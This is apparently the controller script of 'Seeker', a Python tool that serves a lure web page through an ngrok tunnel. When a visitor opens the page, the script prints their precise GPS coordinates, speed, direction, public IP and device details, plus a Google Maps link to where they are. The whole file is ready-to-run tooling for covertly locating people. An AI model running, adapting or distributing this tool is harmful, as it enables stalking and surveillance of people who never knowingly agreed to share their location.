#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function

import os
import time
import json
import requests
import subprocess as subp

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

result = '/var/www/html/nearyou/php/result.txt'
info = '/var/www/html/nearyou/php/info.txt'
api = 'http://localhost:4040/api/tunnels'
site = 'nearyou'
ver = '1.0.1'

try:
	raw_input          # Python 2
except NameError:
	raw_input = input  # Python 3

def banner():
	os.system('tput reset')
	print (C +
	r'''                        __
  ______  ____   ____  |  | __  ____ _______
 /  ___/_/ __ \_/ __ \ |  |/ /_/ __ \\_  __ \
 \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/
/____  > \___  >\___  >|__|_ \ \___  >|__|
	 \/      \/     \/      \/     \/        ''' + W)
	print ('\n' + G + '[>]' + C + ' Created By : ' + W + 'thewhiteh4t')
	print (G + '[>]' + C + ' Version    : ' + W + ver + '\n')

def network():
	try:
		requests.get('http://www.google.com/', timeout = 1)
		print (G + '[+]' + C + ' Checking Internet Connection...' + W, end='')
		print (G + ' Working' + W + '\n')
	except requests.ConnectionError:
		print (R + '[!]' + C + ' You are Not Connected to the Internet...Quiting...' + W)
		exit()

def version():
	print (G + '[+]' + C + ' Checking For Seeker Updates...' + W)
	update = requests.get('https://raw.githubusercontent.com/thewhiteh4t/seeker/master/version.txt')
	update = update.text.split(' ')[1]
	update = update.strip()

	if update != ver:
		print ('\n' + G + '[!]' + C + ' A New Version is Available : ' + W + update)
		ans = raw_input('\n' + G + '[!]' + C + ' Update ? [y/n] : ' + W)
		if ans == 'y':
			print ('\n' + G + '[+]' + C + ' Updating...' + W + '\n')
			subp.check_output(['git', 'pull'])
			print ('\n' + G + '[+]' + C + ' Script Updated...Please Execute Again...')
			exit()
		elif ans == 'n':
			pass
		else:
			print ('\n' + R + '[-]' + C + ' Invalid Character...Skipping...'+ W)
	else:
		print ('\n' + G + '[+]' + C + ' Script is up-to-date...' + W)

def ngrok():
	global api
	global site
	print ('\n' + G + '[!]' + C + ' Starting Apache Server...' + W)
	subp.check_output(['service', 'apache2', 'start'])
	print ('\n' + G + '[!]' + C + ' Checking for Ngrok Updates...' + W + '\n')
	subp.call(['ngrok', 'update'])
	print ('\n' + G + '[+]' + C + ' Starting Ngrok...' + W + '\n')
	subp.Popen(['ngrok', 'http', '80'], stdin=subp.PIPE,stderr=subp.PIPE, stdout=subp.PIPE)
	time.sleep(10)
	r1 = requests.get('{}'.format(api))
	page = r1.content
	json1 = json.loads(page)
	for item in json1['tunnels']:
		if item['proto'] == 'https':
			print ( G + '[+]' + C + ' URL : ' + W + item['public_url'] + '/' + site + '/')

def wait():
	printed = False
	while True:
		time.sleep(2)
		size = os.path.getsize(result)
		if size == 0 and printed == False:
			print('\n' + G + '[+]' + C + ' Waiting for User Interaction...' + W + '\n')
			printed = True
		if size > 0:
			main()

def main():
	global result
	try:
		with open (info, 'r') as file2:
			file2 = file2.read()
			json3 = json.loads(file2)
			for value in json3['dev']:
				print (G + '[+]' + C + ' Device Information : ' + W + '\n')
				print (G + '[+]' + C + ' OS         : ' + W + value['os'])
				print (G + '[+]' + C + ' Platform   : ' + W + value['platform'])
				try:
					print (G + '[+]' + C + ' CPU Cores  : ' + W + value['cores'])
				except TypeError:
					pass
				print (G + '[+]' + C + ' RAM        : ' + W + value['ram'])
				print (G + '[+]' + C + ' GPU Vendor : ' + W + value['vendor'])
				print (G + '[+]' + C + ' GPU        : ' + W + value['render'])
				print (G + '[+]' + C + ' Resolution : ' + W + value['wd'] + 'x' + value['ht'])
				print (G + '[+]' + C + ' Browser    : ' + W + value['browser'])
				print (G + '[+]' + C + ' Public IP  : ' + W + value['ip'])
	except ValueError:
		pass

	try:
		with open (result, 'r') as file:
			file = file.read()
			json2 = json.loads(file)
			for value in json2['info']:
				lat = value['lat']
				lon = value['lon']
				acc = value['acc']
				alt = value['alt']
				dir = value['dir']
				spd = value['spd']

				print ('\n' + G + '[+]' + C + ' Location Information : ' + W + '\n')
				print (G + '[+]' + C + ' Latitude  : ' + W + lat + C + ' deg')
				print (G + '[+]' + C + ' Longitude : ' + W + lon + C + ' deg')
				print (G + '[+]' + C + ' Accuracy  : ' + W + acc + C + ' m')

				if alt == '':
					print (R + '[-]' + C + ' Altitude  : ' + W + 'Not Available')
				else:
					print (G + '[+]' + C + ' Altitude  : ' + W + alt + C + ' m')

				if dir == '':
					print (R + '[-]' + C + ' Direction : ' + W + 'Not Available')
				else:
					print (G + '[+]' + C + ' Direction : ' + W + dir + C + ' deg')

				if spd == '':
					print (R + '[-]' + C + ' Speed     : ' + W + 'Not Available')
				else:
					print (G + '[+]' + C + ' Speed     : ' + W + spd + C + ' m/s')
	except ValueError:
		error = file
		print ('\n' + R + '[-] ' + W + error)
		repeat()

	def maps():
		print ('\n' + G + '[+]' + C + ' Google Maps : ' + W + 'https://www.google.com/maps/place/' + lat + '+' + lon)
		repeat()
	maps()

def clear():
	global result
	with open (result, 'w+'): pass
	with open (info, 'w+'): pass

def repeat():
	clear()
	wait()
	main()

def quit():
	global result
	with open (result, 'w+'): pass
	os.system('pkill ngrok')
	exit()

try:
	banner()
	network()
	version()
	ngrok()
	wait()
	main()

except KeyboardInterrupt:
	print ('\n' + R + '[!]' + C + ' Keyboard Interrupt.' + W)
	quit()
